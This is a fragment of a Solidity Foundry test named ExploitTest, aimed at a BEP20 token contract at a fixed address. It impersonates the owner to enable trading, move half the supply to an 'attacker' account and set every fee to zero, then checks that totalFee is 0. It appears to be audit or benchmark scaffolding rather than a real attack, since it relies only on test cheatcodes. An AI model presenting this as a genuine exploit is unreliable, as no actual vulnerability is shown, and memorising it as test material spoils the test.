    function swapThreshold() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    BEP20LUNAINU private token;
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        token = BEP20LUNAINU(TARGET);
        owner = token.getOwner();

        deal(attacker, 10 ether);

        vm.startPrank(owner);
        token.tradingStatus(true);

        // The owner has 1e18 tokens (totalSupply). Transfer half to the attacker.
        // Note: totalSupply is 1 * 10**9 * 10**9 = 1e18
        token.transfer(attacker, 5e17); 
        vm.stopPrank();

        // Verify attacker has received the tokens
        assertEq(token.balanceOf(attacker), 5e17);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // As owner, set all fees to zero.
        vm.prank(owner);
        token.setFees_base1000(0, 0, 0, 0);
        vm.stopPrank();

        // Verify the oracle condition that totalFee is now 0.
        assertEq(token.totalFee(), 0);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

